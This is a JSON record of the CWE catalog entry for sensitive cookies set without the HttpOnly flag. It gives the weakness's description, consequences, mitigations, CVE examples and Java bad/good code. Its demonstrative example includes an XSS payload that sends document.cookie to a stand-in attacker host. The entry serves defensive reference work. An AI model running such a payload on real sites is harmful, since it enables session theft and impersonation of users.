{
    "@ID": "1004",
    "@Name": "Sensitive Cookie Without 'HttpOnly' Flag",
    "@Abstraction": "Variant",
    "@Structure": "Simple",
    "@Status": "Incomplete",
    "Description": "The product uses a cookie to store sensitive information, but the cookie is not marked with the HttpOnly flag.",
    "Extended_Description": "The HttpOnly flag directs compatible browsers to prevent client-side script from accessing cookies. Including the HttpOnly flag in the Set-Cookie HTTP response header helps mitigate the risk associated with Cross-Site Scripting (XSS) where an attacker's script code might attempt to read the contents of a cookie and exfiltrate information obtained. When set, browsers that support the flag will not reveal the contents of the cookie to a third party via client-side script executed via XSS.",
    "Related_Weaknesses": {
        "Related_Weakness": {
            "@Nature": "ChildOf",
            "@CWE_ID": "732",
            "@View_ID": "1000",
            "@Ordinal": "Primary"
        }
    },
    "Applicable_Platforms": {
        "Language": {
            "@Class": "Not Language-Specific",
            "@Prevalence": "Undetermined"
        },
        "Technology": {
            "@Class": "Web Based",
            "@Prevalence": "Undetermined"
        }
    },
    "Background_Details": {
        "Background_Detail": "An HTTP cookie is a small piece of data attributed to a specific website and stored on the user's computer by the user's web browser. This data can be leveraged for a variety of purposes including saving information entered into form fields, recording user activity, and for authentication purposes. Cookies used to save or record information generated by the user are accessed and modified by script code embedded in a web page. While cookies used for authentication are created by the website's server and sent to the user to be attached to future requests. These authentication cookies are often not meant to be accessed by the web page sent to the user, and are instead just supposed to be attached to future requests to verify authentication details."
    },
    "Modes_Of_Introduction": {
        "Introduction": {
            "Phase": "Implementation"
        }
    },
    "Likelihood_Of_Exploit": "Medium",
    "Common_Consequences": {
        "Consequence": [
            {
                "Scope": "Confidentiality",
                "Impact": "Read Application Data",
                "Note": "If the HttpOnly flag is not set, then sensitive information stored in the cookie may be exposed to unintended parties."
            },
            {
                "Scope": "Integrity",
                "Impact": "Gain Privileges or Assume Identity",
                "Note": "If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user."
            }
        ]
    },
    "Detection_Methods": {
        "Detection_Method": {
            "@Detection_Method_ID": "DM-14",
            "Method": "Automated Static Analysis",
            "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
            "Effectiveness": "High"
        }
    },
    "Potential_Mitigations": {
        "Mitigation": {
            "Phase": "Implementation",
            "Description": "Leverage the HttpOnly flag when setting a sensitive cookie in a response.",
            "Effectiveness": "High",
            "Effectiveness_Notes": "While this mitigation is effective for protecting cookies from a browser's own scripting engine, third-party components or plugins may have their own engines that allow access to cookies. Attackers might also be able to use XMLHTTPResponse to read the headers directly and obtain the cookie."
        }
    },
    "Demonstrative_Examples": {
        "Demonstrative_Example": {
            "Intro_Text": "In this example, a cookie is used to store a session ID for a client's interaction with a website. The intention is that the cookie will be sent to the website with each request made by the client.",
            "Body_Text": [
                "The snippet of code below establishes a new cookie to hold the sessionID.",
                "The HttpOnly flag is not set for the cookie. An attacker who can perform XSS could insert malicious script such as:",
                "When the client loads and executes this script, it makes a request to the attacker-controlled web site. The attacker can then log the request and steal the cookie.",
                "To mitigate the risk, use the setHttpOnly(true) method."
            ],
            "Example_Code": [
                {
                    "@Nature": "Bad",
                    "@Language": "Java",
                    "xhtml:div": {
                        "xhtml:br": [
                            null,
                            null
                        ],
                        "#text": "String sessionID = generateSessionId();Cookie c = new Cookie(\"session_id\", sessionID);response.addCookie(c);"
                    }
                },
                {
                    "@Nature": "Attack",
                    "@Language": "JavaScript",
                    "xhtml:div": "document.write('<img src=\"http://attacker.example.com/collect-cookies?cookie=' + document.cookie . '\">'"
                },
                {
                    "@Nature": "Good",
                    "@Language": "Java",
                    "xhtml:div": {
                        "xhtml:br": [
                            null,
                            null,
                            null
                        ],
                        "#text": "String sessionID = generateSessionId();Cookie c = new Cookie(\"session_id\", sessionID);c.setHttpOnly(true);response.addCookie(c);"
                    }
                }
            ]
        }
    },
    "Observed_Examples": {
        "Observed_Example": [
            {
                "Reference": "CVE-2022-24045",
                "Description": "Web application for a room automation system has client-side Javascript that sets a sensitive cookie without the HTTPOnly security attribute, allowing the cookie to be accessed.",
                "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24045"
            },
            {
                "Reference": "CVE-2014-3852",
                "Description": "CMS written in Python does not include the HTTPOnly flag in a Set-Cookie header, allowing remote attackers to obtain potentially sensitive information via script access to this cookie.",
                "Link": "https://www.cve.org/CVERecord?id=CVE-2014-3852"
            },
            {
                "Reference": "CVE-2015-4138",
                "Description": "Appliance for managing encrypted communications does not use HttpOnly flag.",
                "Link": "https://www.cve.org/CVERecord?id=CVE-2015-4138"
            }
        ]
    },
    "References": {
        "Reference": [
            {
                "@External_Reference_ID": "REF-2"
            },
            {
                "@External_Reference_ID": "REF-3"
            },
            {
                "@External_Reference_ID": "REF-4"
            },
            {
                "@External_Reference_ID": "REF-5"
            }
        ]
    },
    "Mapping_Notes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": {
            "Reason": {
                "@Type": "Acceptable-Use"
            }
        }
    },
    "Content_History": {
        "Submission": {
            "Submission_Name": "CWE Content Team",
            "Submission_Organization": "MITRE",
            "Submission_Date": "2017-01-02",
            "Submission_Version": "2.10",
            "Submission_ReleaseDate": "2017-01-19"
        },
        "Modification": [
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2017-11-08",
                "Modification_Comment": "updated Applicable_Platforms, References, Relationships"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2020-02-24",
                "Modification_Comment": "updated Applicable_Platforms, Relationships"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2021-10-28",
                "Modification_Comment": "updated Relationships"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2023-01-31",
                "Modification_Comment": "updated Description"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2023-04-27",
                "Modification_Comment": "updated Detection_Factors, References, Relationships, Time_of_Introduction"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2023-06-29",
                "Modification_Comment": "updated Mapping_Notes"
            },
            {
                "Modification_Name": "CWE Content Team",
                "Modification_Organization": "MITRE",
                "Modification_Date": "2023-10-26",
                "Modification_Comment": "updated Observed_Examples"
            }
        ]
    }
}